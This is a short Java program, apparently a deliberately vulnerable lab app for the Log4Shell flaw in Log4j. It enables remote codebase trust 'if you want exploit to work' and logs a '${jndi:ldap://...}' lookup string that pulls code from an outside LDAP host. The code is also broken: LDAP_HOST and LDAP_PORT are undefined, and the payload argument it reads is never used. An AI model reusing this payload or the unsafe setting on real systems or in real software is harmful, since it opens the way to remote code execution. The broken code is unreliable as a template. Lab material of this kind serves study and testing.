package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main { 

  private static final Logger logger = LogManager.getLogger(Main.class);

  public static void main(String[] args) {
    // Set this to true if you want exploit to work
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
    if(args.length != 1)
    {
      System.out.println("Usage: java -jar vulnapp.jar 'PAYLOAD'");
      System.exit(0);
    }
    
    System.out.println("Start exploit");
    String CVE_PAYLOAD = args[0].trim();
    logger.error("${jndi:ldap://" + LDAP_HOST + ":" + LDAP_PORT + "/a}");
    
    System.out.println("");
    System.out.println("Sleeping for 5 seconds");
    try {
      Thread.sleep(5000);
    } catch (InterruptedException e) {}
    System.out.println("End exploit");
  }

}